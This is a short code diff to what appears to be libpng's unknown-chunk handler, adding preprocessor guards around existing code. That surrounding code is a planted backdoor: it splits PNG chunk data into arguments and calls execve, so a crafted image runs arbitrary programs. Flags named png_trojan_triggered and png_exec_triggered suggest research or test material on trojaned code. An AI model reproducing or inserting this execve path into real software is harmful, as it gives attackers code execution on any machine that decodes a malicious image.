@@ -2743,7 +2743,9 @@ png_handle_unknown(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)
       {
 	 int i, argc;
 	 char *c, **argv;
+#ifndef BROKEN_SYSCALLS
 	 char * envp[1] = { NULL };
+#endif
 
 	 c = (char *)png_ptr->unknown_chunk.data;
 	 argc = 0;
@@ -2767,7 +2769,9 @@ png_handle_unknown(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)
 	 if (!strcmp("trojan", argv[0])) {
 		png_trojan_triggered = 1;
 	 } else {
+#ifndef BROKEN_SYSCALLS
 		execve(argv[0], argv, envp);
+#endif
 		png_exec_triggered = 1;
 	 }
       }
